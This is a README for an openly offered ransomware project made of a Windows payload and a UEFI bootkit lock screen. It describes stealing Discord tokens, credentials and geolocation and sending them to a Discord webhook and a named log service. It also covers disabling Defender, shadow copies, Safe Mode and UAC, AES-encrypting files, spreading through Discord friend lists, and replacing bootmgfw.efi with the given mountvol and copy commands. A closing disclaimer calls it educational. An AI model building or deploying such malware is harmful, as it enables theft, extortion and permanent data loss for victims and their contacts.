#         OPENSOURCE RANSOMWARE
# - - - - - - - - - - - - - - - - - - - - -

p.s. for the efi headers go to [yoppeh’s efi headers repo](https://github.com/yoppeh/efi)

Overview
A two-component system: a Windows payload performing AES-256 file encryption with data exfiltration, and a UEFI pre-boot lock screen that replaces the Windows Boot Manager until a password is entered.

Project Structure
project/
main.cpp Windows encryption payload
efi.dll UEFI lock screen source
inject.dll Compiled UEFI module (renamed from efi.dll)
README.md

Architecture
Windows Payload (main.cpp):

Data collection (Discord tokens, credentials, IP, geolocation)

Data exfiltration (Discord webhook + log service)

System modification (disable Defender, shadow copies, Safe Mode, UAC)

AES-256 file encryption to *.locked extension

Bootkit installation (replace bootmgfw.efi with inject.dll)

System reboot

UEFI Boot Sequence (inject.dll):

Check NVRAM UnlockedFlag (skip lock if set)

Display lock screen with password prompt

Five attempts max, then cold reboot

On success: set flag, delete boot entry, self-delete, chain-load Windows

Component 1: Windows Payload (main.cpp)
Build Requirements
Command: cl /EHsc /O2 main.cpp /Fe:main.exe

Requires MSVC or MinGW-w64, Python 3.x, Administrator privileges, and inject.dll in the same directory. Linked libraries: wininet.lib, advapi32.lib, crypt32.lib, psapi.lib, netapi32.lib, credui.lib, shell32.lib.

Encryption System
Key Generation: 64-character random string from 88 possible characters (A-Z, a-z, 0-9, special characters). Uses std::random_device seeded Mersenne Twister PRNG, yielding approximately 2^412 possible combinations.

AES-256 Process: Windows CryptoAPI (PROV_RSA_AES) with SHA-256 key derivation. Files encrypted with CBC mode and PKCS#7 padding, renamed to original.ext.locked. Original files deleted.

Excluded from encryption: .locked files, DECRYPT_ME, run.exe, inject.dll, system directories, boot files.

Key handling: The key is cleared from memory after encryption. It exists only in the Discord webhook message. Key loss means permanent encryption.

Decryption: The generated DECRYPT_ME.bat only removes the .locked extension. It does not perform AES decryption. Proper decryption requires the original key and CryptDecrypt().

HWID System
Format: [seconds_since_midnight]-[12_random_chars]-[desktop_name]
Example: [42815]-[K7MXP9Q4VN2B]-[WinSta0\Default]

Components: execution time, random alphanumeric string, Window Station name. Transmitted via Discord webhook, stored on ESP, and embedded in DECRYPT_ME.bat.

Data Exfiltration
Discord webhook: HWID + encryption key + IP address.
Log service: Credentials and tokens sent to python-vxgd.onrender.com/log.
Format: username:password:IPv4:IPv4Bypass:token:email:website:IPv6

Collected data: Discord tokens (local LevelDB + Chrome), Windows credentials, GPS coordinates, city, country, public IPv4/IPv6, Google Maps link.

Discord Spreader
Extracts valid Discord token, retrieves friend list, sends message to each friend.

Warning: Default 2.0 second delay between messages triggers rate limits and may cause account termination. Increase to 10-15 seconds minimum:
send_message_to_user(working_token, int(friend_id), "hi", delay=15.0)

Component 2: UEFI Module (efi.dll / inject.dll)
Build Requirements
Compiled as UEFI x64 Dynamic Link Library using EDK2 or GNU-EFI toolchain.

Default Password
ADMIN (hardcoded, modifiable in source):
static CHAR16 AdminPassword[] = { 'A','D','M','I','N', 0 };

NVRAM Variables
UnlockedFlag: UINT64, 0 = locked, 1 = unlocked.

Boot Flow
Check UnlockedFlag in NVRAM. If set, skip to Windows Boot Manager.

Read \EFI\Microsoft\Boot\config\status.txt from ESP. Content "FULL" displays "works perfectly", else "works".

Display lock screen, prompt for password.

On success: set flag, delete boot entry from BootOrder, self-delete EFI file, launch bootmgfw.windows.efi.

On 5 failed attempts: 5-second delay, cold reboot.

Deployment
InstallBootloader() modifies the EFI System Partition:
mountvol S: /S
copy S:\EFI\Microsoft\Boot\bootmgfw.efi S:\EFI\Microsoft\Boot\bootmgfw.windows.efi
copy inject.dll S:\EFI\Microsoft\Boot\bootmgfw.efi
mountvol S: /D

System Modifications
Persistence: Two scheduled tasks (SystemUpdateTask on logon, MicrosoftWindowsUpdate daily at 09:00).

Recovery prevention: Shadow copies deleted, WinRE disabled, Safe Mode registry corrupted, UAC disabled, Task Manager and Registry Editor blocked, Windows Defender terminated and disabled, Microsoft update domains blocked in hosts file.

License
[CC BY-NC-ND 4.0](https://creativecommons.org/licenses/by-nc-nd/4.0/)

This software is provided for educational and research purposes only. Unauthorized deployment against systems without explicit permission is illegal. The authors assume no liability for misuse.
